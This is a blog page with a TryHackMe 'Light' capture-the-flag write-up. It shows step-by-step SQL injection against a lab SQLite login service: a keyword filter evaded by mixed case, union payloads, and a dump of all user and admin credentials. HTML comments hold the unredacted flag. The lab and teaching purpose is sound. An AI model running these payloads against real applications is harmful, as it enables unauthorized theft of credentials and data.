<!DOCTYPE html>
<html lang="en" dir="ltr">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <title>Light | THM Writeup :: CyberJagadeesh - Learn Cyber Security</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta
  name="description"
  content="Introduction Detailed walkthroughs for Light CTF challenges on TryHackMe .
Description I am working on a database application called Light! Would you like to try it out? If so, the application is running on port 1337. You can connect to it using nc 10.10.95.233 1337 You can use the username smokey in order to get started.
Enumaration sudo echo 10.10.95.233 light.thm &gt;&gt; /etc/hosts Mapped the ip to domain light.thm.
NetCat We receive the password when a valid username is entered.
"
/>
<meta
  name="keywords"
  content="cyber security, penetration testing, ethical hacking, vulnerability assessment, network security, application security, web application security, security testing, red teaming, bug bounty, CTFs, cybersecurity challenges, hacking tutorials, security tools, exploit development, reverse engineering, penetration tester, security researcher, security analyst, information security, digital forensics, incident response, threat intelligence, security awareness, social engineering, phishing, malware analysis, cryptography, cloud security, IoT security, mobile security, how to become a penetration tester, penetration testing tools, CTF challenges for beginners, web application penetration testing, network penetration testing, exploit development tutorial, reverse engineering techniques, bug bounty hunting tips, security research projects, cyber security certifications"
/>
<meta name="robots" content="noodp" /><link rel="manifest" href="/manifest.json" /><meta property="og:url" content="http://localhost:1313/posts/thm/light/writeup/">
  <meta property="og:site_name" content="CyberJagadeesh">
  <meta property="og:title" content="Light | THM Writeup">
  <meta property="og:description" content="Introduction Detailed walkthroughs for Light CTF challenges on TryHackMe .
Description I am working on a database application called Light! Would you like to try it out? If so, the application is running on port 1337. You can connect to it using nc 10.10.95.233 1337 You can use the username smokey in order to get started.
Enumaration sudo echo 10.10.95.233 light.thm &gt;&gt; /etc/hosts Mapped the ip to domain light.thm.
NetCat We receive the password when a valid username is entered.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-02-19T21:02:46+05:30">
    <meta property="article:modified_time" content="2025-02-19T21:02:46+05:30">
    <meta property="article:tag" content="SQLITE">
    <meta property="article:tag" content="SQLi">
      <meta property="og:see_also" content="http://localhost:1313/posts/thm/rabbitstore/writeup/">
      <meta property="og:see_also" content="http://localhost:1313/posts/thm/smol/writeup/">
      <meta property="og:see_also" content="http://localhost:1313/posts/thm/backtrack/writeup/">
      <meta property="og:see_also" content="http://localhost:1313/posts/block/writeup/">
      <meta property="og:see_also" content="http://localhost:1313/posts/pyrat/writeup/">
      <meta property="og:see_also" content="http://localhost:1313/posts/thelondonbridge/writeup/">


  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Light | THM Writeup">
  <meta name="twitter:description" content="Introduction Detailed walkthroughs for Light CTF challenges on TryHackMe .
Description I am working on a database application called Light! Would you like to try it out? If so, the application is running on port 1337. You can connect to it using nc 10.10.95.233 1337 You can use the username smokey in order to get started.
Enumaration sudo echo 10.10.95.233 light.thm &gt;&gt; /etc/hosts Mapped the ip to domain light.thm.
NetCat We receive the password when a valid username is entered.">


<link rel="canonical" href="http://localhost:1313/posts/thm/light/writeup/" />

<link rel="shortcut icon" href="/favicon.ico" />
<link rel="stylesheet" href="/css/index.5287fd9d41d8a879613a40ae3cfd190b68c27952b809c28ce66a58d6c634d0cb.css">





      <script async src="https://www.googletagmanager.com/gtag/js?id=G-376DY6PW0W"></script>
      <script>
        var doNotTrack = false;
        if ( false ) {
          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
          var doNotTrack = (dnt == "1" || dnt == "yes");
        }
        if (!doNotTrack) {
          window.dataLayer = window.dataLayer || [];
          function gtag(){dataLayer.push(arguments);}
          gtag('js', new Date());
          gtag('config', 'G-376DY6PW0W');
        }
      </script>




  
  <script type="application/ld+json">
  {"@context":"https://schema.org","@type":"Article","author":{"@type":"Person","name":"CyberJagadeesh"},"dateModified":"2025-02-19T21:02:46+05:30","datePublished":"2025-02-19T21:02:46+05:30","description":"Introduction Detailed walkthroughs for Light CTF challenges on TryHackMe .\nDescription I am working on a database application called Light! Would you like to try it out? If so, the application is running on port 1337. You can connect to it using nc 10.10.95.233 1337 You can use the username smokey in order to get started.\nEnumaration sudo echo 10.10.95.233 light.thm \u0026gt;\u0026gt; /etc/hosts Mapped the ip to domain light.thm.\nNetCat We receive the password when a valid username is entered.\n","image":"/posts/thm/light/light.png","name":"Light | THM Writeup","url":"http://localhost:1313/posts/thm/light/writeup/"}
</script>

</head>
<body class="flex flex-col min-h-screen w-full bg-slate-50 dark:bg-gray-800">
    
<div class="fixed right-0 top-0 z-50 flex items-center justify-center bg-gray-200 p-2 text-sm uppercase text-black sm:bg-red-200 md:bg-yellow-200 lg:bg-green-200 xl:bg-blue-200 2xl:bg-pink-200">
  <span class="block sm:hidden">all</span>
  <span class="hidden sm:block md:hidden">sm</span>
  <span class="hidden md:block lg:hidden">md</span>
  <span class="hidden lg:block xl:hidden">lg</span>
  <span class="hidden xl:block 2xl:hidden">xl</span>
  <span class="hidden 2xl:block">2xl</span>
</div>

  <header class="flex flex-none justify-center z-10">
    <div class="flex flex-row gap justify-between w-full max-w-4xl lg:max-w-5xl h-12 mt-3">
  <div class="flex-none ml-2 md:ml-0">
    <a href="/" class="">
      <img class="h-12 w-12 rounded-full object-cover bg-gray-100" src="/logo.png" alt="logo">
    </a>
  </div>
  <div class="flex-1"></div>
  <div class="flex-none">
    



<nav class="h-full static">
  <button id="navbar-menu-toggle" type="button" class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg md:hidden" aria-controls="navbar-menu" aria-expanded="false">
    <span class="sr-only">Open main menu</span>
    <i class="w-8 h-8">
      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-menu-2" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M4 6l16 0" />
  <path d="M4 12l16 0" />
  <path d="M4 18l16 0" />
</svg>

    </i>
  </button>
  <div class="absolute md:static top-16 left-0 right-0 z-50 hidden w-full md:block md:w-auto" id="navbar-menu">
    <ul class="flex flex-col mx-2 md:mx-0 md:flex-row md:border-0 rounded-sm md:rounded-full px-3 text-base font-medium text-slate-800 dark:text-slate-200 shadow-lg bg-white dark:bg-gray-600 shadow-slate-800/5 dark:shadow-slate-200/5 ring-1 ring-slate-900/5 dark:ring-slate-100/5">
    
        <li id="about" class="">
          <a class="block px-3 py-3 hover:text-emerald-600"
            href="/about/" title="About">About</a>
        </li>
      
    
        <li id="post" class="">
          <a class="block px-3 py-3 hover:text-emerald-600 text-emerald-600"
            href="/posts/" title="Post">Post</a>
        </li>
      
    
    </ul>
  </div>
</nav>


  </div>
  
  <div class="flex-none mx-1"></div>
  
  <div class="flex-none md:hidden">
    <a href=/search/ class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg" aria-controls="navbar-menu" aria-expanded="false">
      <span class="sr-only">Search</span>
      <i class="w-8 h-8">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
    <path stroke="none" d="M0 0h24v24H0z" fill="none" />
    <path d="M10 10m-7 0a7 7 0 1 0 14 0a7 7 0 1 0 -14 0" />
    <path d="M21 21l-6 -6" />
</svg>

      </i>
    </a>
  </div>
  <div class="darkmode-toggle flex flex-none mr-2 md:mr-0">
    <label for="darkmode-toggle" class="flex items-center px-3 cursor-pointer rounded-full bg-gray-100 dark:bg-gray-600" title="Toggle dark mode">
      <input name="darkmode-toggle" id="darkmode-toggle" type="checkbox" class="sr-only peer" aria-label="Toggle dark mode">
      <div class="group flex flex-row gap-1 justify-center h-8 px-1 rounded-full bg-white dark:bg-gray-700">
        <i class="h-6 w-6 flex-none rounded-full bg-yellow-400 place-self-center peer-checked:group-[]:invisible">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brightness-down" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
   <path d="M12 12m-3 0a3 3 0 1 0 6 0a3 3 0 1 0 -6 0"></path>
   <path d="M12 5l0 .01"></path>
   <path d="M17 7l0 .01"></path>
   <path d="M19 12l0 .01"></path>
   <path d="M17 17l0 .01"></path>
   <path d="M12 19l0 .01"></path>
   <path d="M7 17l0 .01"></path>
   <path d="M5 12l0 .01"></path>
   <path d="M7 7l0 .01"></path>
</svg>

        </i>
        <i class="h-6 w-6 flex-none rounded-full place-self-center invisible peer-checked:group-[]:visible">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-moon-stars" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
   <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z"></path>
   <path d="M17 4a2 2 0 0 0 2 2a2 2 0 0 0 -2 2a2 2 0 0 0 -2 -2a2 2 0 0 0 2 -2"></path>
   <path d="M19 11h2m-1 -1v2"></path>
</svg>

        </i>
      </div>
    </label>
  </div>
</div>

  </header>
  <main class="flex flex-auto justify-center">
    
<div class="w-full max-w-4xl lg:max-w-5xl">
  <div class="flex flex-col mt-6 mx-2 md:mx-0 rounded-lg overflow-hidden shadow-md bg-white dark:bg-gray-700">
    <div>
      <a href="/posts/thm/light/writeup/">
        <figure>
    <img class="w-full object-cover h-36 md:h-48 xl:h-60" src="/posts/thm/light/light.png"
      alt="Light | THM Writeup" title="Light | THM Writeup"
      loading="lazy"
    >
  </figure>
      </a>
    </div>
    <div class="flex flex-col gap-y-3 p-6">
      <h1 class="text-4xl font-semibold text-slate-800 dark:text-slate-100">
        <a href="/posts/thm/light/writeup/">Light | THM Writeup</a>
      </h1>

      
      
  <ul class="flex flex-row flex-wrap text-slate-500 dark:text-slate-300">
    
      
      <li>
        <a href="/categories/ctf/"
          class="text-sm mr-2 px-2 py-1 rounded border border-emerald-800 bg-emerald-800 text-slate-50">
          CTF
        </a>
      </li>
      
    
    
      
      <li>
        <a href="/tags/sqlite/"
          class="flex flex-row text-sm mr-2 py-1">
          <i class="h-5 w-5 flex-none">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
   <path d="M5 9l14 0"></path>
   <path d="M5 15l14 0"></path>
   <path d="M11 4l-4 16"></path>
   <path d="M17 4l-4 16"></path>
</svg>

          </i>
          <span class="ml-0">SQLITE</span>
        </a>
      </li>
      
      <li>
        <a href="/tags/sqli/"
          class="flex flex-row text-sm mr-2 py-1">
          <i class="h-5 w-5 flex-none">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
   <path d="M5 9l14 0"></path>
   <path d="M5 15l14 0"></path>
   <path d="M11 4l-4 16"></path>
   <path d="M17 4l-4 16"></path>
</svg>

          </i>
          <span class="ml-0">SQLi</span>
        </a>
      </li>
      
    
    
      
      <li>
        <a href="/series/tryhackme/"
          class="flex flex-row text-sm mr-2 py-1">
          <i class="h-5 w-5 flex-none">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
   <path d="M5 9l14 0"></path>
   <path d="M5 15l14 0"></path>
   <path d="M11 4l-4 16"></path>
   <path d="M17 4l-4 16"></path>
</svg>

          </i>
          <span class="ml-0">Tryhackme</span>
        </a>
      </li>
      
    
    
      
      <li>
        <a href="/platforms/linux/"
          class="flex flex-row text-sm mr-2 py-1">
          <i class="h-5 w-5 flex-none">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
   <path d="M5 9l14 0"></path>
   <path d="M5 15l14 0"></path>
   <path d="M11 4l-4 16"></path>
   <path d="M17 4l-4 16"></path>
</svg>

          </i>
          <span class="ml-0">Linux</span>
        </a>
      </li>
      
    
    
      
      <li>
        <a href="/levels/easy/"
          class="flex flex-row text-sm mr-2 py-1">
          <i class="h-5 w-5 flex-none">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
   <path d="M5 9l14 0"></path>
   <path d="M5 15l14 0"></path>
   <path d="M11 4l-4 16"></path>
   <path d="M17 4l-4 16"></path>
</svg>

          </i>
          <span class="ml-0">Easy</span>
        </a>
      </li>
      
    
    
  </ul>



      <div class="flex flex-col gap-y-1 md:flex-row md:gap-y-0 md:gap-x-4 text-slate-500 dark:text-slate-300">
  
  
  <div class="flex flex-row text-base gap-x-1">
    <i class="h-6 w-6 flex-none">
      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
   <path d="M4 7a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2v-12z"></path>
   <path d="M16 3v4"></path>
   <path d="M8 3v4"></path>
   <path d="M4 11h16"></path>
   <path d="M11 15h1"></path>
   <path d="M12 15v3"></path>
</svg>

    </i>
    <time datetime="2025-02-19T21:02:46&#43;05:30">
      2025-02-19
    </time>
  </div>

  <div class="flex flex-row text-base gap-x-1">
    <i class="h-6 w-6 flex-none">
      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hourglass-high" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
   <path d="M6.5 7h11"></path>
   <path d="M6 20v-2a6 6 0 1 1 12 0v2a1 1 0 0 1 -1 1h-10a1 1 0 0 1 -1 -1z"></path>
   <path d="M6 4v2a6 6 0 1 0 12 0v-2a1 1 0 0 0 -1 -1h-10a1 1 0 0 0 -1 1z"></path>
</svg>

    </i>
    <span>
      4 minutes to read
    </span>
  </div>
</div>


      
        
        <section class="prose prose-slate dark:prose-invert w-full max-w-4xl lg:max-w-5xl mt-6">
          <h2>Table of Contents</h2>
          <aside><nav id="TableOfContents">
  <ul>
    <li><a href="#introduction">Introduction</a>
      <ul>
        <li><a href="#description">Description</a></li>
      </ul>
    </li>
    <li><a href="#enumaration">Enumaration</a>
      <ul>
        <li><a href="#netcat">NetCat</a></li>
        <li><a href="#nmap">nmap</a></li>
        <li><a href="#response-analysis">Response analysis</a></li>
        <li><a href="#bypassing-detection">Bypassing detection</a></li>
        <li><a href="#detection-dbms">Detection DBMS</a></li>
        <li><a href="#dumping-dbms-structure">Dumping DBMS Structure</a></li>
        <li><a href="#dumping-all-data">Dumping all data</a></li>
      </ul>
    </li>
  </ul>
</nav></aside>
        </section>
        
      

      <article class="mt-6 w-full max-w-4xl lg:max-w-5xl prose prose-slate dark:prose-invert prose-quoteless post-content">
        <h2 id="introduction">Introduction</h2>
<p>Detailed walkthroughs for <a href="https://tryhackme.com/room/lightroom" target="_blank" rel="noopener">Light</a>
 CTF challenges on <a href="https://tryhackme.com" target="_blank" rel="noopener">TryHackMe</a>
.</p>
<h3 id="description">Description</h3>
<p>I am working on a database application called Light! Would you like to try it out?
If so, the application is running on port 1337. You can connect to it using <code>nc 10.10.95.233 1337</code>
You can use the username <code>smokey</code> in order to get started.</p>
<h2 id="enumaration">Enumaration</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo <span class="nb">echo</span> 10.10.95.233 light.thm &gt;&gt; /etc/hosts
</span></span></code></pre></div><p>Mapped the ip to domain <code>light.thm</code>.</p>
<h3 id="netcat">NetCat</h3>
<p>We receive the password when a valid username is entered.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ nc light.thm <span class="m">1337</span> 
</span></span><span class="line"><span class="cl">Welcome to the Light database!
</span></span><span class="line"><span class="cl">Please enter your username: smokey
</span></span><span class="line"><span class="cl">Password: vYQ5ngPpw8AdUmL
</span></span><span class="line"><span class="cl">Please enter your username: Mike
</span></span><span class="line"><span class="cl">Username not found.
</span></span></code></pre></div><h3 id="nmap">nmap</h3>
<p>Let&rsquo;s scan for other open ports on this IP.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nmap light.thm -sV -sC -p-          
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> 61:c5:06:f2:4a:20:5b:cd:09:4d:72:b0:a5:aa:ce:71 <span class="o">(</span>RSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 51:e0:5f:fa:81:64:d3:d9:26:24:16:ca:45:94:c2:00 <span class="o">(</span>ECDSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 77:e1:36:3b:95:9d:e0:3e:0a:56:82:b2:9d:4c:fe:1a <span class="o">(</span>ED25519<span class="o">)</span>
</span></span><span class="line"><span class="cl">1337/tcp open  waste?
</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Welcome to the Light database!
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Please enter your username:
</span></span><span class="line"><span class="cl"><span class="p">|</span>   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Welcome to the Light database!
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Please enter your username: Username not found.
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Please enter your username:
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><p>We&rsquo;re unable to access the shell via SSH using Smokey&rsquo;s password. Let&rsquo;s attempt to analyze the behavior of the database (1337) instead.</p>
<h3 id="response-analysis">Response analysis</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Please enter your username: <span class="s1">&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">Error: unrecognized token: &#34;&#39;&#39;&#39;</span> LIMIT 30<span class="s2">&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">Please enter your username: &#39;--
</span></span></span><span class="line"><span class="cl"><span class="s2">For strange reasons I can&#39;t explain, any input containing /*, -- or, %0b is not allowed :)
</span></span></span><span class="line"><span class="cl"><span class="s2">Please enter your username: &#39;error  
</span></span></span><span class="line"><span class="cl"><span class="s2">Error: near &#34;</span>error<span class="s2">&#34;: syntax error
</span></span></span><span class="line"><span class="cl"><span class="s2">Please enter your username: error&#39;        
</span></span></span><span class="line"><span class="cl"><span class="s2">Error: unrecognized token: &#34;</span><span class="s1">&#39;error&#39;&#39; LIMIT 30&#34;
</span></span></span><span class="line"><span class="cl"><span class="s1">Please enter your username: &#39;</span>union
</span></span><span class="line"><span class="cl">Ahh there is a word in there I don<span class="err">&#39;</span>t like :<span class="o">(</span>
</span></span></code></pre></div><p>By providing different inputs, we encountered a database error. Based on the inputs and responses above, the SQL query being used appears to be:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;input&#39;</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">30</span><span class="w">
</span></span></span></code></pre></div><h3 id="bypassing-detection">Bypassing detection</h3>
<p>Let&rsquo;s attempt to use some SQL keywords here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Please enter your username: <span class="k">select</span>
</span></span><span class="line"><span class="cl">Ahh there is a word in there I don<span class="s1">&#39;t like :(
</span></span></span><span class="line"><span class="cl"><span class="s1">Please enter your username: union
</span></span></span><span class="line"><span class="cl"><span class="s1">Ahh there is a word in there I don&#39;</span>t like :<span class="o">(</span>
</span></span></code></pre></div><p>It detects the strings <code>select</code> and <code>union</code> and responds with, <code>Ahh, there's a word in there I don't like :(</code>. Let&rsquo;s attempt to bypass this. By changing the case of the word, I was able to bypass it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Please enter your username: Union
</span></span><span class="line"><span class="cl">Username not found.
</span></span><span class="line"><span class="cl">Please enter your username: Select
</span></span><span class="line"><span class="cl">Username not found.
</span></span></code></pre></div><p>By using a mix of uppercase and lowercase in keywords like SELECT and UNION, we can bypass detection.</p>
<h3 id="detection-dbms">Detection DBMS</h3>
<p>Let&rsquo;s attempt a union-based attack.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Please enter your username: <span class="s1">&#39;Union Select true&#39;</span>
</span></span><span class="line"><span class="cl">Password: <span class="m">1</span>
</span></span><span class="line"><span class="cl">Please enter your username: <span class="s1">&#39;Union Select false&#39;</span>
</span></span><span class="line"><span class="cl">Password: <span class="m">0</span>
</span></span></code></pre></div><p>We can execute union attacks successfully. Now, let&rsquo;s try to retrieve the <code>database version</code>. Reference: <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet#database-version" target="_blank" rel="noopener">link1</a>
, <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md#dbms-identification-keyword-based" target="_blank" rel="noopener">link2</a>
</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Please enter your username: <span class="s1">&#39;Union Select @@version&#39;</span>
</span></span><span class="line"><span class="cl">Error: unrecognized token: <span class="s2">&#34;@&#34;</span>
</span></span><span class="line"><span class="cl">Please enter your username: <span class="s1">&#39;Union Select %40%40version&#39;</span>
</span></span><span class="line"><span class="cl">Error: near <span class="s2">&#34;%&#34;</span>: syntax error
</span></span><span class="line"><span class="cl">Please enter your username: <span class="s1">&#39;Union Select version()&#39;</span>
</span></span><span class="line"><span class="cl">Error: no such <span class="k">function</span>: version
</span></span><span class="line"><span class="cl">Please enter your username: <span class="s1">&#39;Union Select v$version&#39;</span>
</span></span><span class="line"><span class="cl">Error: no such column: v<span class="nv">$version</span>
</span></span><span class="line"><span class="cl">Please enter your username: <span class="s1">&#39;Union Select banner FROM v$version&#39;</span>
</span></span><span class="line"><span class="cl">Error: no such table: v<span class="nv">$version</span>
</span></span><span class="line"><span class="cl">Please enter your username: <span class="s1">&#39;Union Select version FROM v$instance&#39;</span>
</span></span><span class="line"><span class="cl">Error: no such table: v<span class="nv">$instance</span>
</span></span><span class="line"><span class="cl">Please enter your username: <span class="s1">&#39;Union Select sqlite_version()&#39;</span>
</span></span><span class="line"><span class="cl">Password: 3.31.1
</span></span></code></pre></div><p>We have received the result indicating that an <code>SQLite database</code> is being used.</p>
<h3 id="dumping-dbms-structure">Dumping DBMS Structure</h3>
<p>Let&rsquo;s use SQLite database keywords and attempt to dump the data. <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md" target="_blank" rel="noopener">Reference</a>
</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Please enter your username: <span class="s1">&#39;Union Select sql From sqlite_master&#39;</span>
</span></span><span class="line"><span class="cl">Password: CREATE TABLE admintable <span class="o">(</span>
</span></span><span class="line"><span class="cl">                   id INTEGER PRIMARY KEY,
</span></span><span class="line"><span class="cl">                   username TEXT,
</span></span><span class="line"><span class="cl">                   password INTEGER<span class="o">)</span>
</span></span><span class="line"><span class="cl">Please enter your username: SELECT    
</span></span><span class="line"><span class="cl">Ahh there is a word in there I don<span class="s1">&#39;t like :(
</span></span></span><span class="line"><span class="cl"><span class="s1">Please enter your username: &#39;</span>Union sELECT group_concat<span class="o">(</span>tbl_name<span class="o">)</span> FROM sqlite_master WHERE <span class="nv">type</span><span class="o">=</span><span class="s1">&#39;table&#39;</span> and tbl_name NOT like <span class="s1">&#39;sqlite_%&#39;</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl">Password: usertable,admintable
</span></span></code></pre></div><p>We have obtained the table names here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Please enter your username: <span class="s1">&#39;Union sELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info(&#39;</span>usertable<span class="s1">&#39;)&#39;</span>
</span></span><span class="line"><span class="cl">Password: id,username,password
</span></span><span class="line"><span class="cl">Please enter your username: <span class="s1">&#39;Union sELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info(&#39;</span>admintable<span class="s1">&#39;)&#39;</span>      
</span></span><span class="line"><span class="cl">Password: id,username,password
</span></span></code></pre></div><p>We have retrieved the column names here.</p>
<h3 id="dumping-all-data">Dumping all data</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Please enter your username: <span class="s1">&#39;Union Select GROUP_CONCAT(username) from usertable&#39;</span>
</span></span><span class="line"><span class="cl">Password: alice,rob,john,michael,smokey,hazel,ralph,steve                                    
</span></span><span class="line"><span class="cl">Please enter your username: <span class="s1">&#39;Union Select GROUP_CONCAT(password) from usertable&#39;</span>             
</span></span><span class="line"><span class="cl">Password: tF8tj2o94WE4LKC,yAn4fPaF2qpCKpR,e74tqwRh2oApPo6,7DV4dwA0g5FacRe,vYQ5ngPpw8AdUmL,EcSuU35WlVipjXG,YO1U9O1m52aJImA,WObjufHX1foR8d7                                         
</span></span></code></pre></div><p>We have extracted the data from the &ldquo;usertable.&rdquo;</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Please enter your username: <span class="s1">&#39;Union Select GROUP_CONCAT(username) from admintable&#39;</span>            
</span></span><span class="line"><span class="cl">Password: T**********n,flag                                                                
</span></span><span class="line"><span class="cl">Please enter your username: <span class="s1">&#39;Union Select GROUP_CONCAT(password) from admintable&#39;</span>
</span></span><span class="line"><span class="cl">Password: mam***************q17,THM<span class="o">{</span>S********************nO?<span class="o">}</span>
</span></span><span class="line"><span class="cl">Please enter your username: 
</span></span></code></pre></div><!-- TryHackMeAdmin -->
<!-- mamZtAuMlrsEy5bp6q17 -->
<!-- THM{SQLit3_InJ3cTion_is_SimplE_nO?} -->
<p>We have extracted the data from the admintable, and this marks the end of the CTF.</p>
<p>Happy Hacking !!! &#x1f60e;</p>

      </article>

      
      


  
<script type="text/javascript">
  (function() {
    const themeToggle = document.querySelector('.darkmode-toggle input');
    const light = 'light';
    const dark = 'dark';
    let isDark = localStorage.theme === dark || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches);
    let theme = isDark ? dark : light;

    const s = document.createElement('script');
    s.type = 'text/javascript';
    const dataset = {
        repo: 'cyberjagadeesh\/cyberjagadeesh.github.io',
        repoId: 'R_kgDOMfA4MA',
        category: 'General',
        categoryId: 'DIC_kwDOMfA4MM4ChYzn',
        mapping: 'url',
        reactionsEnabled: '1',
        emitMetadata: '0',
        theme: theme,
        lang: 'en',
    };
    s.src = 'https://giscus.app/client.js';
    s.crossorigin = 'anonymous';
    s.async = true;
    Object.entries(dataset).forEach(function(a) {
        return s.dataset[a[0]] = a[1];
    });

    const curScriptElement = document.currentScript;
    curScriptElement.parentNode.insertBefore(s, curScriptElement);

    function sendMessage(message) {
      const iframe = document.querySelector('iframe.giscus-frame');
      
      if (!iframe) return;
      iframe.contentWindow.postMessage({ giscus: message }, 'https://giscus.app');
    }

